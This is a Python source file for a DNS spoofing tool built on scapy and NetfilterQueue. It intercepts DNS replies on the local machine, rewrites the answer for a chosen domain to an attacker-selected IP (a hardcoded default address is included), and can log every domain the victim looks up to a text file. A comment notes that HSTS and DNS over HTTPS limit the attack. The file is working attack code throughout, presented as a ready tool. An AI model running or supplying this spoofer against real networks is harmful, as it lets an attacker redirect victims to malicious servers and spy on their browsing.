import os
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.arch import get_if_addr
from scapy.config import conf
from netfilterqueue import NetfilterQueue



###
# The DNS spoofing attack doesn't work on specific pages on newer browsers. 
# That is because for some pages the browsers use HSTS (HTTP strict transport security)
# This means that the browser knows to expect a HTTPS connection for some specific well known somains
# Also, Firefox has a DoH function, which uses DNS through HTTPS, making the DNS packets secure
###

class DNSpoof:

    
    queue = NetfilterQueue()
    interface = conf.iface
    spoof_ip = ''
    save_domains = False
    counter = 0
    f = None

    def __init__(self, ip_to_spoof, domain_to_spoof, save_domains):
        self.att_ip = get_if_addr(self.interface)
        self.spoof_ip = ip_to_spoof
        if self.spoof_ip == '0' :
            self.spoof_ip = "139.59.148.67" 
        self.spoof_domain = domain_to_spoof.encode()
        print(self.spoof_domain)
        if save_domains: 
            self.f = open("sniffed_domains.txt", "w")
            self.save_domains = True
        


            
    def start(self, queue_num):
        try:
            print("Started DNS spoofing attack")
            self.counter = 0
            self.queue.bind(queue_num, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            self.stop()

    def process_packet(self, packet):
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(DNSRR):
            try:
                scapy_pkt = self.modify_packet(scapy_pkt)
            except IndexError:
                pass
            packet.set_payload(bytes(scapy_pkt))
        packet.accept()

    def modify_packet(self, packet):

        qname = packet[DNSQR].qname

        #Write the domain in a txt file, if user chose that
        if self.save_domains:
            domain_to_save = str(qname)
            self.f.write(str(self.counter)+ ". "+domain_to_save+"\n")
            self.counter = self.counter+1
        #Only modifying packets for the domain we want to spoof
        if qname != self.spoof_domain:
            return packet

        print("Modifying for pkt " + str(qname))
        # Crafting a new answer, changing the IP address to the one we want the specific domain to be redirected to
        packet[DNS].an = DNSRR(rrname=qname, rdata = self.spoof_ip)
        packet[DNS].ancount = 1
        # delete checksums and length of packet, because we have modified the packet
        # new calculations are required ( scapy will do automatically )
        # Since we modified the packet, we will delete the checksums and lengths, they are calculated automatically by scapy
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum

        return packet

    def stop(self):
        self.queue.unbind()
        print("Stopped DNS spoofing")
        if self.save_domains:
            self.f.close()
            print("sniffed " + str(self.counter)+ " domains the victim accessed, you can view them at sniffed_domains.txt")